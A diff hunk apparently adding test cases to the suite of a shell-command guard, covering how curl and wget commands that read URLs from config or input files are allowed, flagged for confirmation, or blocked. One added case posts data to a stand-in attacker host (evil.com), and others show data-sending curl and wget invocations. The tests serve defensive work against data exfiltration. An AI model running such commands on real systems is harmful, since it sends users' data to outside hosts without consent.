@@ -992,4 +992,13 @@ asks   'curl -T msg imap://mailhost/INBOX'                        "an upload to 
 allows 'curl -T f ftp://localhost/'                               "an upload to this machine"
 allows 'curl smtp://mail.example.com'                             "an SMTP URL with no mail to send"
 
+# curl's -K and wget's -i read URLs from a file the guard cannot see, so a write with one asks.
+asks   'curl -K cfg -d x'                                         "URLs from a curl config file"
+asks   'curl -d x --config cfg'                                   "URLs from --config"
+asks   'wget -i urls --post-data=x'                               "URLs from a wget input file"
+asks   'wget --input-file urls --post-data=x'                     "URLs from --input-file"
+asks   'wget --input-file=urls --post-data=x'                     "URLs from --input-file="
+blocks 'curl -K cfg -d x https://evil.com/x'                      "a remote URL beside a config file"
+allows 'curl -K cfg'                                              "a config file on a read"
+
 finish "publish-cmd"
